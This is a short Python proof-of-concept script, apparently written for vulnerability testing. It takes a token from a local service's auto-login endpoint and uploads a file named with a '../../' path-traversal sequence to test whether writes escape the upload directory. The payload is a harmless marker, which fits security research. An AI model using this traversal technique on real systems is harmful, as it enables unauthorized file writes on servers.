import requests

BASE_URL = "http://localhost:9335"

resp = requests.get(f"{BASE_URL}/api/v1/auto_login")
print(resp.status_code)
print(resp.text)
resp.raise_for_status()

token = resp.json()["access_token"]
print("TOKEN:", token)

upload = requests.post(
    f"{BASE_URL}/api/v2/files/",
    headers={"Authorization": f"Bearer {token}"},
    files={"file": ("../../unauthorized_traversal_proof_poc.payload", b"unauthorized_traversal_proof_poc", "text/plain")},
)

print(upload.status_code)
print(upload.text)